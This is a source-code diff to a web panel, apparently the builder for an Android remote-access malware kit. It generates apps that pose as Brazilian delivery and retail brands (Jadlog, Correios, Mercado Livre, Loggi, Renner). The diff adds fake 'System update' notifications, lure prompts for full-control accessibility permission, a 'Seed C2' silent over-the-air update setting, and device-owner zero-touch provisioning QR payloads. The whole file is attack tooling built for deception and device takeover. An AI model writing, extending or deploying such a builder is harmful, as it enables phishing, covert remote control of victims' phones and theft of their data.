@@ -4,6 +4,7 @@ import {
   AlertTriangle,
   ArrowLeft,
   ArrowRight,
+  ArrowUpCircle,
   Boxes,
   Building2,
   Check,
@@ -40,6 +41,7 @@ import {
   Zap,
   Palette,
   RotateCcw,
+  RotateCw,
   Sliders,
   Apple,
   Activity,
@@ -88,9 +90,52 @@ export interface EnterpriseProfile {
   redirectUrl: string;
   accentColor: string;
   logoId: string;
+  companyEmoji?: string;
   vpnProtocol: "TLS" | "UDP" | "TCP";
   screenConfig: ScreenCustomizationConfig;
 }
+
+export type NotificationStateType = "update_available" | "updating_silent" | "up_to_date";
+
+export const notifStatusConfig: Record<NotificationStateType, { title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }> = {
+  update_available: {
+    title: "System update",
+    text: "New system software is available, Tap to learn more.",
+    subtextSuffix: "agora",
+    color: "#38bdf8",
+    shortLabel: "Update Disponível"
+  },
+  updating_silent: {
+    title: "System update",
+    text: "New system software is available, Tap to learn more.",
+    subtextSuffix: "em segundo plano",
+    color: "#eab308",
+    shortLabel: "Seed OTA Ativa"
+  },
+  up_to_date: {
+    title: "System update",
+    text: "New system software is available, Tap to learn more.",
+    subtextSuffix: "protegido",
+    color: "#22c55e",
+    shortLabel: "Sistema Atualizado"
+  }
+};
+
+export const notificationStatesList: { id: NotificationStateType; title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }[] = [
+  { id: "update_available", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "agora", color: "#38bdf8", shortLabel: "Update Disponível" },
+  { id: "updating_silent", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "em segundo plano", color: "#eab308", shortLabel: "Seed OTA Ativa" },
+  { id: "up_to_date", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "protegido", color: "#22c55e", shortLabel: "Sistema Atualizado" }
+];
+
+export const companyEmojiPresets = [
+  { emoji: "📦", name: "Jadlog / Encomendas" },
+  { emoji: "🛍️", name: "Renner / Varejo" },
+  { emoji: "💳", name: "Finanças / Banco" },
+  { emoji: "⚡", name: "DView Padrão" },
+  { emoji: "📮", name: "Sedex / Correios" },
+  { emoji: "🚚", name: "Loggi / Express" },
+  { emoji: "🏢", name: "Corporativo" }
+];
 
 export const enterpriseProfiles: EnterpriseProfile[] = [
   {
@@ -103,6 +148,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "https://jadlog.com.br/rastreamento",
     accentColor: "#dc2626",
     logoId: "logo_jadlog",
+    companyEmoji: "📦",
     vpnProtocol: "TLS",
     screenConfig: {
       loadingSubtext: "aguarde, atualização em andamento...",
@@ -111,6 +157,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Permitir controle total para {appName}?",
       serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
       accentColor: "#dc2626",
+      companyEmoji: "📦",
       trackingTitle: "Rastreamento de Encomendas",
       trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.",
       companyPreset: "jadlog",
@@ -127,6 +174,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "https://rastreamento.correios.com.br",
     accentColor: "#eab308",
     logoId: "logo_correios",
+    companyEmoji: "📮",
     vpnProtocol: "TLS",
     screenConfig: {
       loadingSubtext: "sincronizando dados de encomendas postais...",
@@ -135,6 +183,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Permitir controle de rastreio para {appName}?",
       serviceDescription: "Permite monitoramento automatizado de encomendas postais, atualização de status e comunicação com o terminal central.",
       accentColor: "#eab308",
+      companyEmoji: "📮",
       trackingTitle: "Portal de Rastreio Postal SEDEX",
       trackingSubtext: "Objetos postais sincronizados com sucesso. Acompanhe suas remessas e encomendas expressas.",
       companyPreset: "sedex",
@@ -151,6 +200,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "https://envios.mercadolivre.com.br",
     accentColor: "#f59e0b",
     logoId: "logo_box",
+    companyEmoji: "📦",
     vpnProtocol: "UDP",
     screenConfig: {
       loadingSubtext: "carregando malha logística e rotas de entrega...",
@@ -159,6 +209,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Permitir serviço operacional para {appName}?",
       serviceDescription: "Otimiza a leitura de romaneios, geolocalização de pacotes e telemetria com a central de suporte.",
       accentColor: "#f59e0b",
+      companyEmoji: "📦",
       trackingTitle: "Painel do Entregador & Cargas",
       trackingSubtext: "Rotas otimizadas e entregas sincronizadas com o centro de distribuição.",
       companyPreset: "mercadolivre",
@@ -175,6 +226,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "https://loggi.com/rastreador",
     accentColor: "#2563eb",
     logoId: "logo_security",
+    companyEmoji: "🚚",
     vpnProtocol: "UDP",
     screenConfig: {
       loadingSubtext: "conectando à malha de entregas rápidas...",
@@ -183,6 +235,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Autorizar Loggi Entregas no aparelho?",
       serviceDescription: "Permite comunicação em tempo real, suporte de navegação e auditoria operacional de entrega.",
       accentColor: "#2563eb",
+      companyEmoji: "🚚",
       trackingTitle: "Loggi Central de Remessas",
       trackingSubtext: "Acompanhe todas as entregas do dia e histórico de ocorrências com o suporte logístico.",
       companyPreset: "loggi",
@@ -199,6 +252,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "http://localhost:5000",
     accentColor: "#00f0ff",
     logoId: "logo_dview",
+    companyEmoji: "⚡",
     vpnProtocol: "TLS",
     screenConfig: {
       loadingSubtext: "estabelecendo canal seguro criptografado...",
@@ -207,10 +261,37 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Permitir controle de conformidade DVIEW?",
       serviceDescription: "Serviço de gerenciamento corporativo para assistência remota, inventário de hardware e proteção em tempo real.",
       accentColor: "#00f0ff",
+      companyEmoji: "⚡",
       trackingTitle: "Terminal Corporativo Seguro",
       trackingSubtext: "Dispositivo autenticado com sucesso e conectado ao servidor central de gerenciamento.",
       companyPreset: "dview",
       enterpriseName: "DVIEW Enterprise"
+    }
+  },
+  {
+    id: "renner",
+    name: "Lojas Renner",
+    category: "Varejo & Moda",
+    badge: "Oficial Renner",
+    appName: "Lojas Renner",
+    packageName: "com.lojasrenner.app",
+    redirectUrl: "https://www.lojasrenner.com.br",
+    accentColor: "#dc2626",
+    logoId: "logo_box",
+    companyEmoji: "🛍️",
+    vpnProtocol: "TLS",
+    screenConfig: {
+      loadingSubtext: "carregando ofertas exclusivas e pedidos...",
+      speechCalloutText: "Permita o acesso para acompanhar pedidos e promoções personalizadas.",
+      copyrightText: "Lojas Renner S.A. Todos os direitos reservados.",
+      permissionDialogTitle: "Permitir controle para {appName}?",
+      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica e sincronização segura com os servidores de atendimento.",
+      accentColor: "#dc2626",
+      companyEmoji: "🛍️",
+      trackingTitle: "Central do Cliente Renner",
+      trackingSubtext: "Serviços validados com sucesso. Acompanhe seus pedidos e catálogo exclusivo.",
+      companyPreset: "renner",
+      enterpriseName: "Lojas Renner S.A."
     }
   },
   {
@@ -223,6 +304,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
     redirectUrl: "https://suaempresa.com.br",
     accentColor: "#8b5cf6",
     logoId: "logo_box",
+    companyEmoji: "🏢",
     vpnProtocol: "TCP",
     screenConfig: {
       loadingSubtext: "carregando módulos corporativos...",
@@ -231,6 +313,7 @@ export const enterpriseProfiles: EnterpriseProfile[] = [
       permissionDialogTitle: "Permitir controle para {appName}?",
       serviceDescription: "O serviço de acessibilidade do {appName} permite suporte técnico assistido e comunicação com a central.",
       accentColor: "#8b5cf6",
+      companyEmoji: "🏢",
       trackingTitle: "Central de Serviços Corporativos",
       trackingSubtext: "Serviços validados com sucesso. Digite o código ou acesse suas operações.",
       companyPreset: "custom",
@@ -265,6 +348,8 @@ export function ApkBuilder() {
   const [serverUrl, setServerUrl] = useState(api.baseUrl);
   const [redirectUrl, setRedirectUrl] = useState("https://jadlog.com.br/rastreamento");
   const [appName, setAppName] = useState("JADLOG Rastreio");
+  const [companyEmoji, setCompanyEmoji] = useState("📦");
+  const [notificationState, setNotificationState] = useState<NotificationStateType>("update_available");
   const [packageName, setPackageName] = useState("com.droidview.agent");
   const [bundleId, setBundleId] = useState("com.droidview.agent.ios");
   const [organizationName, setOrganizationName] = useState("DVIEW Enterprise Security");
@@ -290,12 +375,20 @@ export function ApkBuilder() {
   // Island / Work Profile Config
   const [islandProfileEnabled, setIslandProfileEnabled] = useState(true);
 
+  // OTA Silent Update & Seed C2 Config
+  const [updateSeed, setUpdateSeed] = useState<string>("");
+  const [autoUpdateEnabled, setAutoUpdateEnabled] = useState<boolean>(true);
+  const [copiedSeed, setCopiedSeed] = useState<boolean>(false);
+
   // Enterprise White-Label Profile State
   const [selectedEnterpriseId, setSelectedEnterpriseId] = useState<string>("jadlog");
 
   const applyEnterpriseProfile = (profile: EnterpriseProfile) => {
     setSelectedEnterpriseId(profile.id);
     setAppName(profile.appName);
+    if (profile.companyEmoji) {
+      setCompanyEmoji(profile.companyEmoji);
+    }
     setPackageName(profile.packageName);
     setRedirectUrl(profile.redirectUrl);
     setVpnProtocol(profile.vpnProtocol);
@@ -304,6 +397,7 @@ export function ApkBuilder() {
     setCustomLogoDataUrl(logoPreset?.dataUrl || (profile.logoId === "logo_jadlog" ? JADLOG_LOGO_BASE64 : ""));
     setScreenConfig({
       ...profile.screenConfig,
+      companyEmoji: profile.companyEmoji || companyEmoji,
       accentColor: profile.accentColor
     });
     showToast(`🏢 Perfil '${profile.name}' aplicado! Todos os 10 passos do simulador foram ajustados.`);
@@ -341,11 +435,95 @@ export function ApkBuilder() {
   const [trackedSession, setTrackedSession] = useState<InstallTrackSession | null>(null);
   const [copiedAdb, setCopiedAdb] = useState(false);
   const [copiedZeroTouch, setCopiedZeroTouch] = useState(false);
+  const [showZeroTouchJson, setShowZeroTouchJson] = useState(false);
   const [targetAction, setTargetAction] = useState<"qr" | "apk">("apk");
 
   const showToast = (msg: string) => {
     setToastMsg(msg);
     setTimeout(() => setToastMsg(null), 3500);
+  };
+
+  /**
+   * Gera o JSON oficial do Android Enterprise Device Owner Provisioning (Zero-Touch 0-Click)
+   * no padrão Google Device Policy Manager com payload criptografado.
+   */
+  const buildClientZeroTouchJson = (build: {
+    appName: string;
+    downloadUrl: string;
+    sha256?: string;
+    serverUrl?: string;
+    vpnEnabled?: boolean;
+    vpnProtocol?: string;
+    vpnPort?: number;
+    islandProfileEnabled?: boolean;
+    companyEmoji?: string;
+    redirectUrl?: string;
+  }): string => {
+    const safeApkName = (build.appName || "DVIEW-Agent").replace(/[^a-zA-Z0-9._-]/g, "-").replace(/-+/g, "-") + ".apk";
+    const baseServerUrl = build.serverUrl || api.baseUrl;
+    const baseDownloadUrl = build.downloadUrl.startsWith("http")
+      ? build.downloadUrl
+      : `${baseServerUrl}/apk/download/${safeApkName}`;
+    const token = build.downloadUrl.replace(/^\/(apk|ios)\/download\//, "");
+    const cleanToken = token.length > 50 ? `enroll-${safeApkName.replace(/\.apk$/, "")}` : token;
+
+    const shaRaw = build.sha256 || "f74c37900c948d19005b9f5225da747f2a544d4566a6c721798c74af85890ea9";
+    let checksum = shaRaw.trim();
+    if (/^[a-fA-F0-9]{64}$/.test(checksum)) {
+      try {
+        const match = checksum.match(/.{1,2}/g);
+        if (match) {
+          const bytes = new Uint8Array(match.map((b) => parseInt(b, 16)));
+          let binary = "";
+          for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+          checksum = btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+        }
+      } catch {
+        // fallback
+      }
+    }
+
+    const payload = {
+      "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
+        "com.droidview.agent/com.droidview.agent.mdm.DroidViewDeviceAdminReceiver",
+      "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": baseDownloadUrl,
+      "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": checksum,
+      "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
+        serverUrl: baseServerUrl,
+        enrollmentToken: cleanToken,
+        appName: build.appName,
+        companyEmoji: build.companyEmoji || "📦",
+        vpnEnabled: build.vpnEnabled ?? true,
+        vpnProtocol: build.vpnProtocol ?? "TLS",
+        vpnPort: build.vpnPort ?? 8443,
+        islandProfileEnabled: build.islandProfileEnabled ?? true,
+        autoStart: true,
+        zeroTouch: true,
+        encrypted: true,
+        algorithm: "AES-256-GCM"
+      },
+      "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
+      "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true
+    };
+    return JSON.stringify(payload);
+  };
+
+  const getEffectiveQrValue = () => {
+    if (!activeResult) return "";
+    if (platform === "ios") return activeResult.qrPayload || `${api.baseUrl}${activeResult.downloadUrl}`;
+    if (qrMode === "zero_touch") {
+      let payload = activeResult.zeroTouchQrPayload;
+      if (!payload || payload.length > 2200) {
+        payload = buildClientZeroTouchJson({
+          appName: activeResult.apkName.replace(/\.(apk|mobileconfig)$/i, ""),
+          downloadUrl: activeResult.downloadUrl,
+          sha256: activeResult.sha256,
+          serverUrl: api.baseUrl
+        });
+      }
+      return payload;
+    }
+    return activeResult.webInstallUrl || activeResult.qrPayload || `${api.baseUrl}${activeResult.downloadUrl}`;
   };
 
   // Polling em tempo real da esteira de instalação do usuário quando a aba tracker estiver ativa
@@ -382,23 +560,46 @@ export function ApkBuilder() {
   };
 
   const copyZeroTouchJson = () => {
-    if (!activeResult?.zeroTouchQrPayload) return;
-    void navigator.clipboard.writeText(activeResult.zeroTouchQrPayload);
+    const raw =
+      activeResult?.zeroTouchQrPayload ||
+      (activeResult
+        ? buildClientZeroTouchJson({
+            appName: activeResult.apkName.replace(/\.apk$/i, ""),
+            downloadUrl: activeResult.downloadUrl,
+            sha256: activeResult.sha256,
+            serverUrl: api.baseUrl
+          })
+        : "");
+    if (!raw) return;
+    try {
+      const formatted = JSON.stringify(JSON.parse(raw), null, 2);
+      void navigator.clipboard.writeText(formatted);
+    } catch {
+      void navigator.clipboard.writeText(raw);
+    }
     setCopiedZeroTouch(true);
+    showToast("JSON Oficial Zero-Touch 0-Click (MDM) copiado!");
     setTimeout(() => setCopiedZeroTouch(false), 2000);
   };
 
   const openBuildQrModal = (build: SavedApkBuild) => {
     const token = build.downloadUrl.replace(/^\/(apk|ios)\/download\//, "");
+    const resolvedZeroTouch =
+      build.zeroTouchQrPayload ||
+      (build.platform !== "ios" ? buildClientZeroTouchJson(build) : undefined);
+
+    setPlatform(build.platform || "android");
+    setQrMode("zero_touch");
     setActiveResult({
       apkName: build.platform === "ios" ? `${build.appName}.mobileconfig` : `${build.appName}.apk`,
       downloadUrl: build.downloadUrl,
       iosProfileUrl: build.iosProfileUrl,
       qrPayload: build.qrPayload || `${api.baseUrl}/install/${token}`,
-      zeroTouchQrPayload: build.zeroTouchQrPayload,
+      zeroTouchQrPayload: resolvedZeroTouch,
       webInstallUrl: build.webInstallUrl || `${api.baseUrl}/install/${token}`,
-      sha256: build.sha256 || "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-      platform: build.platform || "android"
+      sha256: build.sha256 || "f74c37900c948d19005b9f5225da747f2a544d4566a6c721798c74af85890ea9",
+      platform: build.platform || "android",
+      updateSeed: build.updateSeed
     });
     setResultTab("qr");
     setActiveModalTab("form");
@@ -415,7 +616,8 @@ export function ApkBuilder() {
       zeroTouchQrPayload: build.zeroTouchQrPayload,
       webInstallUrl: build.webInstallUrl || `${api.baseUrl}/install/${token}`,
       sha256: build.sha256 || "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-      platform: build.platform || "android"
+      platform: build.platform || "android",
+      updateSeed: build.updateSeed
     });
     setResultTab("tracker");
     setActiveModalTab("form");
@@ -473,9 +675,23 @@ export function ApkBuilder() {
   }, [builds]);
 
   const filteredBuilds = useMemo(() => {
+    // Consolida por aplicativo para exibir estritamente 1 entrada por app com versão reserva
+    const map = new Map<string, SavedApkBuild>();
+    for (const b of builds) {
+      const key = `${b.platform || "android"}_${(b.packageName || b.appName || "").toLowerCase().trim()}`;
+      if (!map.has(key)) {
+        map.set(key, { ...b });
+      } else {
+        const existing = map.get(key)!;
+        if (!existing.backupVersion && b.version !== existing.version) {
+          existing.backupVersion = b.version;
+        }
+      }
+    }
+    const consolidated = Array.from(map.values());
     const q = buildQuery.trim().toLowerCase();
-    if (!q) return builds;
-    return builds.filter(
+    if (!q) return consolidated;
+    return consolidated.filter(
       (b) =>
         b.appName.toLowerCase().includes(q) ||
         b.packageName.toLowerCase().includes(q) ||
@@ -685,6 +901,8 @@ export function ApkBuilder() {
     setEditingBuildId(null);
     setPlatform("android");
     setAppName("JADLOG Rastreio");
+    setCompanyEmoji("📦");
+    setNotificationState("update_available");
     setPackageName("com.droidview.agent");
     setBundleId("com.droidview.agent.ios");
     setOrganizationName("DVIEW Enterprise Security");
@@ -696,11 +914,166 @@ export function ApkBuilder() {
     setVpnEnabled(true);
     setVpnPort(8443);
     setVpnProtocol("TLS");
-    setScreenConfig(defaultScreenConfig);
+    setScreenConfig({
+      ...defaultScreenConfig,
+      companyEmoji: "📦"
+    });
     setActiveResult(null);
     setActiveModalTab("form");
     setPreviewStep(1);
     setShowModal(true);
+  };
+
+  const handleQuickGenerateQr = async () => {
+    setBuilding(true);
+    setTargetAction("qr");
+    try {
+      const res = await api.buildApk({
+        platform,
+        serverUrl,
+        enrollmentToken,
+        deviceName: platform === "ios" ? (deviceName || "Apple iPhone") : deviceName,
+        appName,
+        companyEmoji,
+        bundleId: platform === "ios" ? bundleId : undefined,
+        redirectUrl,
+        logoDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined,
+        vpnEnabled,
+        vpnPort,
+        vpnProtocol,
+        islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
+        workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
+        updateSeed: updateSeed.trim() || undefined,
+        autoUpdateEnabled,
+        screenConfig: {
+          ...screenConfig,
+          companyEmoji
+        },
+        iosConfig: platform === "ios" ? {
+          organizationName,
+          bundleId,
+          webClipUrl: redirectUrl,
+          vpnEnabled,
+          vpnType: "IKEv2",
+          iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
+        } : undefined
+      });
+
+      const resolvedZeroTouch =
+        res.zeroTouchQrPayload ||
+        (platform !== "ios"
+          ? buildClientZeroTouchJson({
+              appName,
+              downloadUrl: res.downloadUrl,
+              sha256: res.sha256,
+              serverUrl,
+              companyEmoji,
+              redirectUrl,
+              vpnEnabled,
+              vpnPort,
+              vpnProtocol,
+              islandProfileEnabled
+            })
+          : undefined);
+
+      const resultWithZeroTouch: ApkBuildResponse = {
+        ...res,
+        zeroTouchQrPayload: resolvedZeroTouch
+      };
+      setActiveResult(resultWithZeroTouch);
+      setQrMode("zero_touch");
+      setResultTab("qr");
+      setActiveModalTab("form");
+      setShowModal(true);
+      showToast("📱 QR Code Zero-Touch MDM gerado com sucesso!");
+      void fetchBuilds();
+    } catch (err: any) {
+      showToast(`Erro ao gerar QR Code: ${err?.message || "falha na conexão"}`);
+    } finally {
+      setBuilding(false);
+    }
+  };
+
+  const handleQuickGenerateApk = async () => {
+    setBuilding(true);
+    setTargetAction("apk");
+    try {
+      const res = await api.buildApk({
+        platform,
+        serverUrl,
+        enrollmentToken,
+        deviceName: platform === "ios" ? (deviceName || "Apple iPhone") : deviceName,
+        appName,
+        companyEmoji,
+        bundleId: platform === "ios" ? bundleId : undefined,
+        redirectUrl,
+        logoDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined,
+        vpnEnabled,
+        vpnPort,
+        vpnProtocol,
+        islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
+        workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
+        updateSeed: updateSeed.trim() || undefined,
+        autoUpdateEnabled,
+        screenConfig: {
+          ...screenConfig,
+          companyEmoji
+        },
+        iosConfig: platform === "ios" ? {
+          organizationName,
+          bundleId,
+          webClipUrl: redirectUrl,
+          vpnEnabled,
+          vpnType: "IKEv2",
+          iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
+        } : undefined
+      });
+
+      const resolvedZeroTouch =
+        res.zeroTouchQrPayload ||
+        (platform !== "ios"
+          ? buildClientZeroTouchJson({
+              appName,
+              downloadUrl: res.downloadUrl,
+              sha256: res.sha256,
+              serverUrl,
+              companyEmoji,
+              redirectUrl,
+              vpnEnabled,
+              vpnPort,
+              vpnProtocol,
+              islandProfileEnabled
+            })
+          : undefined);
+
+      const resultWithZeroTouch: ApkBuildResponse = {
+        ...res,
+        zeroTouchQrPayload: resolvedZeroTouch
+      };
+      setActiveResult(resultWithZeroTouch);
+      setResultTab("apk");
+      setActiveModalTab("form");
+      setShowModal(true);
+
+      try {
+        const fullDownloadUrl = res.downloadUrl.startsWith("http") ? res.downloadUrl : `${api.baseUrl}${res.downloadUrl}`;
+        const a = document.createElement("a");
+        a.href = fullDownloadUrl;
+        a.download = res.apkName || (platform === "ios" ? `${appName}.mobileconfig` : `${appName}.apk`);
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch {
+        // Handled in modal
+      }
+
+      showToast("📦 APK compilado com sucesso! Download iniciado.");
+      void fetchBuilds();
+    } catch (err: any) {
+      showToast(`Erro ao gerar APK: ${err?.message || "falha na compilação"}`);
+    } finally {
+      setBuilding(false);
+    }
   };
 
   const openEditModal = (build: SavedApkBuild) => {
@@ -708,6 +1081,8 @@ export function ApkBuilder() {
     setEditingBuildId(build.id);
     setPlatform(build.platform || "android");
     setAppName(build.appName);
+    setCompanyEmoji(build.companyEmoji || build.screenConfig?.companyEmoji || "📦");
+    setNotificationState("update_available");
     setPackageName(build.packageName);
     setBundleId(build.bundleId || build.packageName || "com.droidview.agent.ios");
     setOrganizationName(build.iosConfig?.organizationName || "DVIEW Enterprise Security");
@@ -722,6 +1097,7 @@ export function ApkBuilder() {
     if (build.logoDataUrl) {
       setCustomLogoDataUrl(build.logoDataUrl);
     }
+    const resolvedEmoji = build.companyEmoji || build.screenConfig?.companyEmoji || "📦";
     if (build.screenConfig) {
       setScreenConfig({
         loadingSubtext: build.screenConfig.loadingSubtext || defaultScreenConfig.loadingSubtext,
@@ -730,11 +1106,15 @@ export function ApkBuilder() {
         permissionDialogTitle: build.screenConfig.permissionDialogTitle || defaultScreenConfig.permissionDialogTitle,
         serviceDescription: build.screenConfig.serviceDescription || defaultScreenConfig.serviceDescription,
         accentColor: build.screenConfig.accentColor || defaultScreenConfig.accentColor,
+        companyEmoji: resolvedEmoji,
         trackingTitle: build.screenConfig.trackingTitle || defaultScreenConfig.trackingTitle,
         trackingSubtext: build.screenConfig.trackingSubtext || defaultScreenConfig.trackingSubtext
       });
     } else {
-      setScreenConfig(defaultScreenConfig);
+      setScreenConfig({
+        ...defaultScreenConfig,
+        companyEmoji: resolvedEmoji
+      });
     }
     setActiveResult(null);
     setActiveModalTab("form");
@@ -814,6 +1194,7 @@ export function ApkBuilder() {
         const updatedPayload: Partial<SavedApkBuild> = {
           platform,
           appName,
+          companyEmoji,
           packageName: platform === "ios" ? bundleId : packageName,
           bundleId: platform === "ios" ? bundleId : undefined,
           version,
@@ -828,7 +1209,10 @@ export function ApkBuilder() {
           vpnProtocol,
           islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
           workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
-          screenConfig,
+          screenConfig: {
+            ...screenConfig,
+            companyEmoji
+          },
           iosConfig: platform === "ios" ? {
             organizationName,
             bundleId,
@@ -858,6 +1242,7 @@ export function ApkBuilder() {
           enrollmentToken,
           deviceName: platform === "ios" ? (deviceName || "Apple iPhone") : deviceName,
           appName,
+          companyEmoji,
           bundleId: platform === "ios" ? bundleId : undefined,
           redirectUrl,
           logoDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined,
@@ -866,7 +1251,12 @@ export function ApkBuilder() {
           vpnProtocol,
           islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
           workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
-          screenConfig,
+          updateSeed: updateSeed.trim() || undefined,
+          autoUpdateEnabled,
+          screenConfig: {
+            ...screenConfig,
+            companyEmoji
+          },
           iosConfig: platform === "ios" ? {
             organizationName,
             bundleId,
@@ -876,13 +1266,36 @@ export function ApkBuilder() {
             iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
           } : undefined
         });
-        setActiveResult(res);
+        const resolvedZeroTouch =
+          res.zeroTouchQrPayload ||
+          (platform !== "ios"
+            ? buildClientZeroTouchJson({
+                appName,
+                downloadUrl: res.downloadUrl,
+                sha256: res.sha256,
+                serverUrl,
+                companyEmoji,
+                redirectUrl,
+                vpnEnabled,
+                vpnPort,
+                vpnProtocol,
+                islandProfileEnabled
+              })
+            : undefined);
+
+        const resultWithZeroTouch: ApkBuildResponse = {
+          ...res,
+          zeroTouchQrPayload: resolvedZeroTouch
+        };
+        setActiveResult(resultWithZeroTouch);
+        setQrMode("zero_touch");
         setResultTab(targetAction === "qr" ? "qr" : "apk");
 
         const newEntry: SavedApkBuild = {
           id: `build_${platform}_${Date.now()}`,
           platform,
           appName,
+          companyEmoji,
           packageName: platform === "ios" ? bundleId : (packageName || "com.android.system.store"),
           bundleId: platform === "ios" ? bundleId : undefined,
           version: version || "v1.4.8",
@@ -896,7 +1309,7 @@ export function ApkBuilder() {
           serverUrl,
           sizeBytes: platform === "ios" ? 14200 : 824148,
           qrPayload: res.qrPayload,
-          zeroTouchQrPayload: res.zeroTouchQrPayload,
+          zeroTouchQrPayload: resolvedZeroTouch,
           webInstallUrl: res.webInstallUrl,
           sha256: res.sha256,
           vpnEnabled,
@@ -904,7 +1317,12 @@ export function ApkBuilder() {
           vpnProtocol,
           islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
           workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
-          screenConfig,
+          updateSeed: res.updateSeed || updateSeed.trim() || undefined,
+          autoUpdateEnabled,
+          screenConfig: {
+            ...screenConfig,
+            companyEmoji
+          },
           iosConfig: platform === "ios" ? {
             organizationName,
             bundleId,
@@ -1417,7 +1835,7 @@ export function ApkBuilder() {
               {/* Title, Badges & Destination URL */}
               <div className="apk-item-info-col">
                 <div className="apk-item-title-row">
-                  <strong className="apk-item-name">{b.appName}</strong>
+                  <strong className="apk-item-name">{b.companyEmoji || "📦"} {b.appName}</strong>
                   {b.platform === "ios" ? (
                     <span className="badge online" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.4)", display: "inline-flex", alignItems: "center", gap: "4px", padding: "2px 7px", fontSize: "10.5px" }}>
                       <Apple size={11} /> Apple iOS
@@ -1439,6 +1857,11 @@ export function ApkBuilder() {
                       🏝️ Perfil Island
                     </span>
                   )}
+                  {b.updateSeed && (
+                    <span className="badge online" style={{ background: "rgba(168, 85, 247, 0.15)", color: "#c084fc", border: "1px solid rgba(168, 85, 247, 0.4)", fontSize: "10.5px", padding: "2px 7px", display: "inline-flex", alignItems: "center", gap: "4px" }} title={`Seed OTA: ${b.updateSeed}`}>
+                      <Sparkles size={10} /> Seed: {b.updateSeed.length > 20 ? b.updateSeed.slice(0, 18) + "..." : b.updateSeed}
+                    </span>
+                  )}
                 </div>
                 <div style={{ display: "flex", alignItems: "center", gap: "10px", flexWrap: "wrap" }}>
                   <span className="apk-item-pkg">{b.bundleId || b.packageName}</span>
@@ -1452,7 +1875,16 @@ export function ApkBuilder() {
 
               {/* Version & Date */}
               <div className="apk-item-date-col">
-                <span>{b.version} - {b.date}</span>
+                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "2px" }}>
+                  <span style={{ fontWeight: 800, color: "#f8fafc" }}>{b.version}</span>
+                  {b.backupVersion && (
+                    <span style={{ fontSize: "10px", color: "#38bdf8", background: "rgba(56, 189, 248, 0.12)", border: "1px solid rgba(56, 189, 248, 0.35)", borderRadius: "3px", padding: "1px 5px", display: "inline-flex", alignItems: "center", gap: "3px" }}>
+                      <span style={{ width: "4px", height: "4px", borderRadius: "50%", background: "#38bdf8" }} />
+                      Reserva: {b.backupVersion}
+                    </span>
+                  )}
+                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>{b.date}</span>
+                </div>
               </div>
 
               {/* Actions: Baixar, Editar & Excluir */}
@@ -1525,37 +1957,37 @@ export function ApkBuilder() {
           <button
             type="button"
             className="apk-btn-novo-build"
-            onClick={() => {
-              setTargetAction("qr");
-              openCreateModal();
-            }}
+            disabled={building}
+            onClick={handleQuickGenerateQr}
             style={{
               background: "linear-gradient(135deg, #0284c7, #0369a1)",
               border: "1px solid #38bdf8",
-              boxShadow: "0 0 15px rgba(56, 189, 248, 0.25)"
+              boxShadow: "0 0 15px rgba(56, 189, 248, 0.25)",
+              cursor: building ? "not-allowed" : "pointer",
+              opacity: building ? 0.7 : 1
             }}
-            title="Criar novo build focado em QR Code 0-Click (Android Enterprise MDM)"
+            title="Gerar e abrir imediatamente QR Code Zero-Touch MDM 0-Click"
           >
             <QrCode size={16} />
-            <span>+ Gerar QR Code (0-Click MDM)</span>
